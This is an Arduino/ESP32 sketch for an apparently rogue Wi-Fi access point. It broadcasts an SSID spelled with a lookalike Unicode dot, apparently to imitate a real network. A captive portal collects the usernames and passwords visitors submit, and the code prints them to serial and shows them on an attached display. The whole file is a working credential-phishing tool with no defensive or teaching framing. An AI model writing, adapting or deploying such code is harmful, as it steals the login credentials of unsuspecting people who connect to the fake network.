#include <Arduino.h>
#include "captive_portal.h"
#include <TFT_eSPI.h>


#define BACKLIGHT 21
TFT_eSPI tft = TFT_eSPI();

const char *ssid = "CyRithm-2․4G";

void setup() {
  pinMode(BACKLIGHT, OUTPUT);
  digitalWrite(BACKLIGHT, HIGH);

  Serial.begin(115200);
  Serial.println();

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(2);
  tft.drawString("Waiting for client...", 10, 10);

  captivePortalBegin(ssid);

}

void loop() {
  captivePortalLoop();

  String username, pass;
  if (captivePortalGetSubmission(username, pass)) {
    Serial.println(username);
    Serial.println(pass);


	tft.fillRect(40, 40, 240, 50, TFT_BLACK);
	tft.drawString("Username:"+username, 50, 50);
	tft.drawString("Pass:"+pass, 50, 75);
}

}